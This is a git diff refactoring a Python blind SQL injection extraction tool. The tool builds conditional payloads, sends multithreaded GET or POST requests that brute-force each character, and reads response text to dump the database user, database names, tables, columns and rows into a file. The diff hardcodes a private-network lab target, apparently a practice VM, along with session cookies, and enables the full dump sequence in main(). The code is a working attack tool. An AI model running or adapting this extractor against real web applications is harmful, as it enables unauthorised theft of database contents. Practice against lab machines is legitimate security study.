@@ -8,14 +8,18 @@ import os
 import re
 import math
 import concurrent.futures
-from dataclasses import dataclass
 from abc import ABC, abstractmethod
 from pwn import log
+
+import utils
+import structs
 
 
 # Ctrl + c
 def ctrlC(sig, frame):
-    print(f"\n\n[{Color.RED}x{Color.END}] {Color.BOLD}Saliendo...{Color.END}\n")
+    print(
+        f"\n\n[{utils.Color.RED}x{utils.Color.END}] {utils.Color.BOLD}Saliendo...{utils.Color.END}\n"
+    )
     sys.exit(1)
 
 
@@ -23,53 +27,7 @@ signal.signal(signal.SIGINT, ctrlC)
 
 # Global variables
 stop_threads = True
-
-
-# Util Classes
-class Color:
-    PURPLE = "\033[1;35;48m"
-    CYAN = "\033[1;36;48m"
-    BOLD = "\033[1;37;48m"
-    BLUE = "\033[1;34;48m"
-    GREEN = "\033[1;32;48m"
-    YELLOW = "\033[1;33;48m"
-    RED = "\033[1;31;48m"
-    BLACK = "\033[1;30;48m"
-    UNDERLINE = "\033[4;37;48m"
-    END = "\033[1;37;0m"
-
-
-# Data Classes
-@dataclass
-class WrapperRequest:
-    data: str | dict
-    character: int
-    main_url: str
-    headers: dict
-
-
-@dataclass
-class WrapperResponse:
-    response: requests.Response
-    character: int
-
-
-@dataclass
-class DB:
-    name: str
-    tables: list
-
-
-@dataclass
-class Table:
-    name: str
-    columns: list
-    rows: list
-
-    def concat_columns(self) -> str:
-        """Concatenates the columns to display them"""
-
-        return ",'|',".join(self.columns)
+character_finded = 0
 
 
 # Strategies Classes
@@ -81,8 +39,8 @@ class Payload(ABC):
         exploit: str,
         position: int,
         character: int,
-        db: DB | None,
-        table: Table | None,
+        db: structs.DB | None,
+        table: structs.Table | None,
     ) -> str:
         """Build the payload to be used in dependency on what you want to extract from the database"""
         pass
@@ -95,8 +53,8 @@ class ConditionalPayload(Payload):
         exploit: str,
         position: int,
         character: int,
-        db: DB | None,
-        table: Table | None,
+        db: structs.DB | None,
+        table: structs.Table | None,
     ) -> str:
 
         result = ""
@@ -118,122 +76,13 @@ class ConditionalPayload(Payload):
         return result
 
 
-class RequestType(ABC):
-
-    @abstractmethod
-    def build_request(
-        self,
-        data,
-        atribute_to_exploit: str,
-        payload: Payload,
-        main_url: str,
-        headers: dict,
-        info_name: str,
-        position: int,
-        db: DB | None,
-        table: Table | None,
-    ) -> list:
-        """Build the data for the request"""
-        pass
-
-    @abstractmethod
-    def send_request(
-        self,
-        requests_data: WrapperRequest,
-    ) -> WrapperResponse | None:
-        """Send the request that contain the payload"""
-        pass
-
-
-class PostRequest(RequestType):
-
-    def build_request(
-        self,
-        data: dict,
-        atribute_to_exploit: str,
-        payload: Payload,
-        main_url: str,
-        headers: dict,
-        info_name: str,
-        position: int,
-        db: DB | None,
-        table: Table | None,
-    ) -> list:
-
-        result = []
-        characters = list(range(33, 127))
-
-        for character in characters:
-            concat_payload = f"{data[atribute_to_exploit]}{payload.build_payload(info_name,position,character, db, table)}"
-            data[atribute_to_exploit] = concat_payload
-            result.append(WrapperRequest(data, character, main_url, headers))
-
-        return result
-
-    def send_request(
-        self,
-        requests_data: WrapperRequest,
-    ) -> WrapperResponse | None:
-
-        if stop_threads:
-            return None
-
-        response = requests.post(
-            requests_data.main_url,
-            headers=requests_data.headers,
-            data=requests_data.data,
-        )
-
-        return WrapperResponse(response, requests_data.character)
-
-
-class GetRequest(RequestType):
-
-    def build_request(
-        self,
-        data: str,
-        atribute_to_exploit: str,
-        payload: Payload,
-        main_url: str,
-        headers: dict,
-        info_name: str,
-        position: int,
-        db: DB | None,
-        table: Table | None,
-    ) -> list:
-
-        result = []
-        characters = list(range(33, 127))
-
-        for character in characters:
-            result.append(
-                WrapperRequest(
-                    f"{main_url}{data}{payload.build_payload(info_name,position,character, db, table)}",
-                    character,
-                    main_url,
-                    headers,
-                )
-            )
-
-        return result
-
-    def send_request(
-        self,
-        requests_data: WrapperRequest,
-    ) -> WrapperResponse | None:
-
-        if stop_threads:
-            return None
-
-        response = requests.get(str(requests_data.data), headers=requests_data.headers)
-
-        return WrapperResponse(response, requests_data.character)
-
-
 class Condition(ABC):
 
     def __init__(self, value: str):
         self._value = value
+
+    def __str__(self) -> str:
+        return self._value
 
     @abstractmethod
     def get_condition(self, response: requests.Response) -> bool:
@@ -245,7 +94,7 @@ class TextInCondition(Condition):
     def get_condition(self, response: requests.Response) -> bool:
         result = False
 
-        if self._value in response.text:
+        if self._value in response.content.decode():
             result = True
 
         return result
@@ -260,6 +109,142 @@ class StatusEqualCondition(Condition):
             result = True
 
         return result
+
+
+class RequestType(ABC):
+
+    @abstractmethod
+    def build_request(
+        self,
+        data,
+        atribute_to_exploit: str,
+        payload: Payload,
+        main_url: str,
+        headers: dict,
+        info_name: str,
+        position: int,
+        condition: Condition,
+        db: structs.DB | None,
+        table: structs.Table | None,
+    ) -> list:
+        """Build the data for the request"""
+        pass
+
+    @abstractmethod
+    def send_request(
+        self,
+        requests_data: structs.WrapperRequest,
+    ) -> int | None:
+        """Send the request that contain the payload"""
+        pass
+
+
+class PostRequest(RequestType):
+
+    def __str__(self) -> str:
+        return "POST"
+
+    def build_request(
+        self,
+        data: dict,
+        atribute_to_exploit: str,
+        payload: Payload,
+        main_url: str,
+        headers: dict,
+        info_name: str,
+        position: int,
+        condition: Condition,
+        db: structs.DB | None,
+        table: structs.Table | None,
+    ) -> list:
+
+        result = []
+        characters = list(range(33, 127))
+
+        for character in characters:
+            concat_payload = f"{data[atribute_to_exploit]}{payload.build_payload(info_name,position,character, db, table)}"
+            data[atribute_to_exploit] = concat_payload
+            result.append(
+                structs.WrapperRequest(data, character, main_url, headers, condition)
+            )
+
+        return result
+
+    def send_request(
+        self,
+        requests_data: structs.WrapperRequest,
+    ) -> int | None:
+        global stop_threads
+        global character_finded
+
+        if stop_threads:
+            return None
+
+        response = requests.post(
+            requests_data.main_url,
+            headers=requests_data.headers,
+            data=requests_data.data,
+        )
+
+        if requests_data.condition.get_condition(response):
+            character_finded = requests_data.character
+            stop_threads = True
+
+        return requests_data.character
+
+
+class GetRequest(RequestType):
+
+    def __str__(self) -> str:
+        return "GET"
+
+    def build_request(
+        self,
+        data: str,
+        atribute_to_exploit: str,
+        payload: Payload,
+        main_url: str,
+        headers: dict,
+        info_name: str,
+        position: int,
+        condition: Condition,
+        db: structs.DB | None,
+        table: structs.Table | None,
+    ) -> list:
+
+        result = []
+        characters = list(range(33, 127))
+
+        for character in characters:
+            result.append(
+                structs.WrapperRequest(
+                    f"{main_url}{data}{payload.build_payload(info_name,position,character, db, table)}",
+                    character,
+                    main_url,
+                    headers,
+                    condition,
+                )
+            )
+
+        return result
+
+    def send_request(
+        self,
+        requests_data: structs.WrapperRequest,
+    ) -> int | None:
+        global stop_threads
+        global character_finded
+
+        if stop_threads:
+            return None
+
+        response = requests.get(str(requests_data.data), headers=requests_data.headers)
+
+        if requests_data.condition.get_condition(response):
+            character_finded = requests_data.character
+            stop_threads = True
+
+        return requests_data.character
 
 
 # Main Class
@@ -284,15 +269,22 @@ class Extractor:
         self.num_threads = num_threads
         self.data = data
         self.atribute_to_exploit = atribute_to_exploit
-        self._character_finded = 0
         self._dbs: list = []
 
     @staticmethod
-    def init_with_interface():
+    def init_with_interface(
+        label_url,
+        label_method,
+        label_headers,
+        label_data,
+        label_exploit,
+        label_condition,
+        label_threads,
+    ):
         """Alternative constructor, initializes the attributes with an interactive interface"""
 
         main_url = ""
-        method = ""
+        method = None
         headers = {}
         data: str | dict = {}
         atribute_to_exploit = ""
@@ -309,31 +301,11 @@ class Extractor:
 
             return math.ceil((answer_size + len(text)) / columns)
 
-        print(
-            f"""
-    {Color.BOLD}#####################################################################################################################################{Color.END}
-    {Color.BLUE}BBBBB   L      IIIII  N   N  DDDD {Color.END}     {Color.RED} SSS     QQQ    L      IIIII{Color.END}      {Color.BLUE}EEEEE  X   X  TTTTT  RRRR     A    CCCC  TTTTT   OOO   RRRR{Color.END}
-    {Color.BLUE}B   B   L        I    NN  N  D   D{Color.END}     {Color.RED}S       Q   Q   L        I  {Color.END}      {Color.BLUE}E       X X     T    R   R   A A   C       T    O   O  R   R{Color.END}
-    {Color.BLUE}BBBBB   L        I    N N N  D   D{Color.END}     {Color.RED} SSS    Q   Q   L        I  {Color.END}      {Color.BLUE}EEEE     X      T    RRRR   AAAAA  C       T    O   O  RRRR{Color.END}
-    {Color.BLUE}B   B   L        I    N  NN  D   D{Color.END}         {Color.RED}S   Q  QQ   L        I  {Color.END}      {Color.BLUE}E       X X     T    R  R   A   A  C       T    O   O  R  R{Color.END}
-    {Color.BLUE}BBBBB   LLLLL  IIIII  N   N  DDDD {Color.END}     {Color.RED}SSSS     QQ  Q  LLLLL  IIIII{Color.END}      {Color.BLUE}EEEEE  X   X    T    R   R  A   A  CCCC    T     OOO   R   R{Color.END}
-    {Color.BOLD}#####################################################################################################################################{Color.END}\n
-    """
-        )
-
-        label_url = log.progress(f"{Color.BOLD}Url{Color.END}")
-        label_method = log.progress(f"{Color.BOLD}Method{Color.END}")
-        label_headers = log.progress(f"{Color.BOLD}Headers{Color.END}")
-        label_data = log.progress(f"{Color.BOLD}Data{Color.END}")
-        label_exploit = log.progress(f"{Color.BOLD}Field to exploit{Color.END}")
-        label_condition = log.progress(f"{Color.BOLD}Condition{Color.END}")
-        label_threads = log.progress(f"{Color.BOLD}Threads{Color.END}")
-
         print("\n\n")
 
         while True:
             input_url = input(
-                f"[{Color.BLUE}?{Color.END}] Request URL with https/http: "
+                f"[{utils.Color.BLUE}?{utils.Color.END}] Request URL with https/http: "
             )
 
             if input_url and ("http://" in input_url or "https://" in input_url):
@@ -342,13 +314,13 @@ class Extractor:
                 print("\033[A\033[J" * get_input_rows(33, input_url), end="")
                 break
             else:
-                print(f"[{Color.RED}x{Color.END}] Input nor accepted")
+                print(f"[{utils.Color.RED}x{utils.Color.END}] Input nor accepted")
                 time.sleep(1)
                 print("\033[A\033[J" * 2, end="")
 
         while True:
             input_method = input(
-                f"[{Color.BLUE}?{Color.END}] Request Method, GET/POST: "
+                f"[{utils.Color.BLUE}?{utils.Color.END}] Request Method, GET/POST: "
             )
 
             if input_method and (input_method == "POST" or input_method == "GET"):
@@ -360,19 +332,19 @@ class Extractor:
                 print("\033[A\033[J", end="")
                 break
             else:
-                print(f"[{Color.RED}x{Color.END}] Input nor accepted")
+                print(f"[{utils.Color.RED}x{utils.Color.END}] Input nor accepted")
                 time.sleep(1)
                 print("\033[A\033[J" * 2, end="")
 
         follow_condition = input(
-            f"[{Color.BLUE}?{Color.END}] Would you like to add headers to the request? y/n: "
+            f"[{utils.Color.BLUE}?{utils.Color.END}] Would you like to add headers to the request? y/n: "
         )
         print("\033[A\033[J", end="")
 
         if follow_condition == "y":
             while True:
                 input_header = input(
-                    f"[{Color.BLUE}?{Color.END}] Request Headers, use the following format <name>:<value> "
+                    f"[{utils.Color.BLUE}?{utils.Color.END}] Request Headers, use the following format <name>:<value> "
                 )
 
                 if input_header:
@@ -382,20 +354,20 @@ class Extractor:
                     print("\033[A\033[J" * get_input_rows(61, input_header), end="")
 
                     follow_condition = input(
-                        f"[{Color.BLUE}?{Color.END}] Would you like to add another header? y/n: "
+                        f"[{utils.Color.BLUE}?{utils.Color.END}] Would you like to add another header? y/n: "
                     )
                     print("\033[A\033[J", end="")
 
                     if follow_condition == "n":
                         break
                 else:
-                    print(f"[{Color.RED}x{Color.END}] Input nor accepted")
+                    print(f"[{utils.Color.RED}x{utils.Color.END}] Input nor accepted")
                     print("\033[A\033[J" * 2, end="")
                     time.sleep(1)
 
         while True:
             input_data = input(
-                f"[{Color.BLUE}?{Color.END}] Values with which the request is correct, in Post Request use the following format <name>:<value> "
+                f"[{utils.Color.BLUE}?{utils.Color.END}] Values with which the request is correct, in Post Request use the following format <name>:<value> "
             )
 
             if input_data:
@@ -406,7 +378,7 @@ class Extractor:
                     print("\033[A\033[J" * get_input_rows(112, input_data), end="")
 
                     follow_condition = input(
-                        f"[{Color.BLUE}?{Color.END}] Would you like to add another value? y/n: "
+                        f"[{utils.Color.BLUE}?{utils.Color.END}] Would you like to add another value? y/n: "
                     )
                     print("\033[A\033[J", end="")
 
@@ -420,14 +392,14 @@ class Extractor:
                     break
 
             else:
-                print(f"[{Color.RED}x{Color.END}] Input nor accepted")
+                print(f"[{utils.Color.RED}x{utils.Color.END}] Input nor accepted")
                 print("\033[A\033[J" * 2, end="")
                 time.sleep(1)
 
         if method == "POST":
             while True:
                 input_exploit = input(
-                    f"[{Color.BLUE}?{Color.END}] Name of the value that we want to exploit: "
+                    f"[{utils.Color.BLUE}?{utils.Color.END}] Name of the value that we want to exploit: "
                 )
 
                 if input_exploit:
@@ -436,13 +408,13 @@ class Extractor:
                     print("\033[A\033[J" * get_input_rows(47, input_data), end="")
                     break
                 else:
-                    print(f"[{Color.RED}x{Color.END}] Input nor accepted")
+                    print(f"[{utils.Color.RED}x{utils.Color.END}] Input nor accepted")
                     time.sleep(1)
                     print("\033[A\033[J" * 2, end="")
 
         while True:
             input_condition = input(
-                f"[{Color.BLUE}?{Color.END}] Text in the response by which we can detect that the result was correct: "
+                f"[{utils.Color.BLUE}?{utils.Color.END}] Text in the response by which we can detect that the result was correct: "
             )
 
             if input_condition:
@@ -451,7 +423,7 @@ class Extractor:
                 print("\033[A\033[J" * get_input_rows(77, input_data), end="")
                 break
             else:
-                print(f"[{Color.RED}x{Color.END}] Input nor accepted")
+                print(f"[{utils.Color.RED}x{utils.Color.END}] Input nor accepted")
                 time.sleep(1)
                 print("\033[A\033[J" * 2, end="")
 
@@ -459,7 +431,7 @@ class Extractor:
         if pc_threads != 1:
             try:
                 input_threads = input(
-                    f"[{Color.BLUE}?{Color.END}] Number of threads 1-{pc_threads}: "
+                    f"[{utils.Color.BLUE}?{utils.Color.END}] Number of threads 1-{pc_threads}: "
                 )
                 print("\033[A\033[J", end="")
                 if (
@@ -468,7 +440,7 @@ class Extractor:
                 ):
                     num_threads = int(input_threads)
             except ValueError:
-                print(f"[{Color.RED}x{Color.END}] Input nor accepted")
+                print(f"[{utils.Color.RED}x{utils.Color.END}] Input nor accepted")
                 time.sleep(1)
                 print("\033[A\033[J" * 2, end="")
         label_threads.status(num_threads)
@@ -488,22 +460,22 @@ class Extractor:
         """Determines the color that is used to display different values of the DB"""
 
         switcher = {
-            "User": Color.UNDERLINE,
-            "DBs": Color.PURPLE,
-            "Tables": Color.CYAN,
-            "Columns": Color.BLUE,
-            "Rows": Color.BLUE,
+            "User": utils.Color.UNDERLINE,
+            "DBs": utils.Color.PURPLE,
+            "Tables": utils.Color.CYAN,
+            "Columns": utils.Color.BLUE,
+            "Rows": utils.Color.BLUE,
         }
 
-        return switcher.get(info_name, Color.BLUE)
+        return switcher.get(info_name, utils.Color.BLUE)
 
     def _get_info(
         self,
         label_info,
         label_menu,
         info_name: str,
-        db: DB | None = None,
-        table: Table | None = None,
+        db: structs.DB | None = None,
+        table: structs.Table | None = None,
     ) -> str:
         """Use Multithreads, build the payload and data to send the request"""
 
@@ -524,6 +496,7 @@ class Extractor:
                 self.headers,
                 info_name,
                 position,
+                self.condition,
                 db,
                 table,
             )
@@ -537,20 +510,18 @@ class Extractor:
                 }
                 for future in concurrent.futures.as_completed(futures):
                     result = future.result()
-                    if result is not None:
-                        label_menu.status(chr(result.character))
 
-                        if self.condition.get_condition(result.response):
-                            self._character_finded = result.character
-                            stop_threads = True
+                    label_menu.status(chr(result))
 
                     if stop_threads:
                         executor.shutdown(wait=False)
                         break
 
             if stop_threads:
-                info += chr(self._character_finded)
-                label_info.status(f"{self._select_color(info_name)}{info}{Color.END}")
+                info += chr(character_finded)
+                label_info.status(
+                    f"{self._select_color(info_name)}{info}{utils.Color.END}"
+                )
 
             position += 1
 
@@ -559,19 +530,19 @@ class Extractor:
     def get_user(self, label_menu) -> None:
         """Get the username that is running the DB process"""
 
-        label_info = log.progress(Color.YELLOW + "User" + Color.END)
+        label_info = log.progress(utils.Color.YELLOW + "User" + utils.Color.END)
         self._get_info(label_info, label_menu, "User")
         print("\n")
 
     def get_dbs(self, label_menu) -> None:
         """Get the names of the data bases"""
 
-        label_info = log.progress(Color.YELLOW + "DBs" + Color.END)
+        label_info = log.progress(utils.Color.YELLOW + "DBs" + utils.Color.END)
         info = self._get_info(label_info, label_menu, "DBs")
 
         new_dbs = info.split(",")
         for db_name in new_dbs:
-            db = DB(db_name, [])
+            db = structs.DB(db_name, [])
             self._dbs.append(db)
 
         print("\n")
@@ -582,13 +553,13 @@ class Extractor:
         for db in self._dbs:
 
             label_info = log.progress(
-                f"{Color.YELLOW}DB{Color.END}:{Color.PURPLE}{db.name}{Color.END} {Color.YELLOW}Tables{Color.END}"
+                f"{utils.Color.YELLOW}DB{utils.Color.END}:{utils.Color.PURPLE}{db.name}{utils.Color.END} {utils.Color.YELLOW}Tables{utils.Color.END}"
             )
             info = self._get_info(label_info, label_menu, "Tables", db)
 
             new_tables = info.split(",")
             for table_name in new_tables:
-                table = Table(table_name, [], [])
+                table = structs.Table(table_name, [], [])
                 db.tables.append(table)
 
         print("\n")
@@ -601,7 +572,7 @@ class Extractor:
             for table in db.tables:
 
                 label_info = log.progress(
-                    f"{Color.YELLOW}DB{Color.END}:{Color.PURPLE}{db.name}{Color.END} {Color.YELLOW}Table{Color.END}:{Color.CYAN}{table.name}{Color.END} {Color.YELLOW}Columns{Color.END}"
+                    f"{utils.Color.YELLOW}DB{utils.Color.END}:{utils.Color.PURPLE}{db.name}{utils.Color.END} {utils.Color.YELLOW}Table{utils.Color.END}:{utils.Color.CYAN}{table.name}{utils.Color.END} {utils.Color.YELLOW}Columns{utils.Color.END}"
                 )
                 info = self._get_info(label_info, label_menu, "Columns", db, table)
 
@@ -619,7 +590,7 @@ class Extractor:
             for table in db.tables:
 
                 label_info = log.progress(
-                    f"{Color.YELLOW}DB{Color.END}:{Color.PURPLE}{db.name}{Color.END} {Color.YELLOW}Table{Color.END}:{Color.CYAN}{table.name}{Color.END} {Color.YELLOW}Rows{Color.END}"
+                    f"{utils.Color.YELLOW}DB{utils.Color.END}:{utils.Color.PURPLE}{db.name}{utils.Color.END} {utils.Color.YELLOW}Table{utils.Color.END}:{utils.Color.CYAN}{table.name}{utils.Color.END} {utils.Color.YELLOW}Rows{utils.Color.END}"
                 )
 
                 info = self._get_info(label_info, label_menu, "Rows", db, table)
@@ -647,21 +618,48 @@ class Extractor:
                 f.write("\n\n\n")
 
         print(
-            f"\n\n[{Color.YELLOW}!{Color.END}] {Color.BOLD}More details in db.txt{Color.END}\n"
+            f"\n\n[{utils.Color.YELLOW}!{utils.Color.END}] {utils.Color.BOLD}More details in db.txt{utils.Color.END}\n"
         )
 
 
 def main():
+    print(
+        f"""
+    {utils.Color.BOLD}#####################################################################################################################################{utils.Color.END}
+    {utils.Color.BLUE}BBBBB   L      IIIII  N   N  DDDD {utils.Color.END}     {utils.Color.RED} SSS     QQQ    L      IIIII{utils.Color.END}      {utils.Color.BLUE}EEEEE  X   X  TTTTT  RRRR     A    CCCC  TTTTT   OOO   RRRR{utils.Color.END}
+    {utils.Color.BLUE}B   B   L        I    NN  N  D   D{utils.Color.END}     {utils.Color.RED}S       Q   Q   L        I  {utils.Color.END}      {utils.Color.BLUE}E       X X     T    R   R   A A   C       T    O   O  R   R{utils.Color.END}
+    {utils.Color.BLUE}BBBBB   L        I    N N N  D   D{utils.Color.END}     {utils.Color.RED} SSS    Q   Q   L        I  {utils.Color.END}      {utils.Color.BLUE}EEEE     X      T    RRRR   AAAAA  C       T    O   O  RRRR{utils.Color.END}
+    {utils.Color.BLUE}B   B   L        I    N  NN  D   D{utils.Color.END}         {utils.Color.RED}S   Q  QQ   L        I  {utils.Color.END}      {utils.Color.BLUE}E       X X     T    R  R   A   A  C       T    O   O  R  R{utils.Color.END}
+    {utils.Color.BLUE}BBBBB   LLLLL  IIIII  N   N  DDDD {utils.Color.END}     {utils.Color.RED}SSSS     QQ  Q  LLLLL  IIIII{utils.Color.END}      {utils.Color.BLUE}EEEEE  X   X    T    R   R  A   A  CCCC    T     OOO   R   R{utils.Color.END}
+    {utils.Color.BOLD}#####################################################################################################################################{utils.Color.END}\n
+    """
+    )
+
+    label_url = log.progress(f"{utils.Color.BOLD}Url{utils.Color.END}")
+    label_method = log.progress(f"{utils.Color.BOLD}Method{utils.Color.END}")
+    label_headers = log.progress(f"{utils.Color.BOLD}Headers{utils.Color.END}")
+    label_data = log.progress(f"{utils.Color.BOLD}Data{utils.Color.END}")
+    label_exploit = log.progress(f"{utils.Color.BOLD}Field to exploit{utils.Color.END}")
+    label_condition = log.progress(f"{utils.Color.BOLD}Condition{utils.Color.END}")
+    label_threads = log.progress(f"{utils.Color.BOLD}Threads{utils.Color.END}")
 
     # Initiate parameters specifying them
     main_url = "http://192.168.1.103/imfadministrator/cms.php?pagename="
-    headers = {"Cookie": "PHPSESSID=s0o0uhl9dthhao3c56lufjkte1"}
+    headers = {"Cookie": "PHPSESSID=nl4laaouglaed8vvlqmpua5k26"}
     data = "home"
     method = GetRequest()
     condition = TextInCondition("Welcome to the IMF Administration")
     payload = ConditionalPayload()
-    num_threads = 1
+    num_threads = 3
     atribute_to_exploit = ""
+
+    label_url.status(main_url)
+    label_method.status(method.__str__())
+    label_headers.status(headers)
+    label_data.status(data)
+    label_exploit.status(atribute_to_exploit)
+    label_condition.status(condition.__str__())
+    label_threads.status(num_threads)
 
     instance = Extractor(
         main_url,
@@ -675,28 +673,21 @@ def main():
     )
 
     # Initiate parameters with interface
-    # instance = Extractor.init_with_interface()
+    # instance = Extractor.init_with_interface(label_url, label_method, label_headers, label_data, label_exploit,label_condition,label_threads)
 
-    label_menu = log.progress(Color.RED + "Brute Force" + Color.END)
+    print("\n")
+    label_menu = log.progress(utils.Color.RED + "Brute Force" + utils.Color.END)
     label_menu.status(" Starting ...")
     print("\n")
     time.sleep(1)
 
     instance.get_user(label_menu)
-    # instance.get_dbs(label_menu)
-    # instance.get_tables(label_menu)
-    # instance.get_columns(label_menu)
-    # instance.get_rows(label_menu)
-    # instance.build_file()
-
-
-def test():
-    headers = {"Cookie": "PHPSESSID=tjqhdl7m9qjkvu1nbvkv29pm86"}
-    response = requests.get(
-        "http://192.168.1.103/imfadministrator/cms.php?pagename=home", headers=headers
-    )
-    print(response.text)
+    instance.get_dbs(label_menu)
+    instance.get_tables(label_menu)
+    instance.get_columns(label_menu)
+    instance.get_rows(label_menu)
+    instance.build_file()
 
 
 if __name__ == "__main__":
-    test()
+    main()
